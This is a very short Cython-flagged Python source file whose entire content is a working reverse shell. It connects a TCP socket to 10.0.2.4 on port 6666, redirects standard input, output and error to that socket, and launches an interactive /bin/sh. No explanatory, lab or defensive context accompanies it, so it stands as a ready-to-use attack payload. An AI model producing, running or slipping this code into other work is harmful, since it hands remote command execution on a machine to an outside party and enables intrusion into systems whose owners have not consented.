#cython: language_level=3

import socket, subprocess, os;

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect(("10.0.2.4", 6666));
os.dup2(s.fileno(), 0);
os.dup2(s.fileno(), 1);
os.dup2(s.fileno(), 2);
p = subprocess.call(["/bin/sh", "-i"]);
